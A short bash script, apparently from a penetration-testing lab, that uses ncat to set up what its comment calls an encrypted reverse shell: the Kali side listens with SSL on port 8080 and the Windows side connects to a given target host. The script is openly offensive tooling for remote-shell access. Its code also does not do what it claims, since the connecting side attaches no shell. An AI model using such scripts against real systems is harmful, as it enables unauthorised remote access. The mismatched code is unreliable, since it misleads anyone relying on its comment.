#!/bin/bash

# Use Ncat to create an encrypted reverse shell from your Windows system to your
# Kali machine.

PROGRAM_NAME=$0

function usage {
    echo "usage: $PROGRAM_NAME kali|windows target"
    exit 1
}

if [ "$#" -ne 2 ]; then
    usage
fi

if [[ $1 == "kali" ]]; then
  # On the Kali machine listen on port 8080.
  ncat -lvp 8080 --ssl &
else
  # On the Windows machine, connect to it via ssl.
  ncat -v $2 8080 --ssl
fi
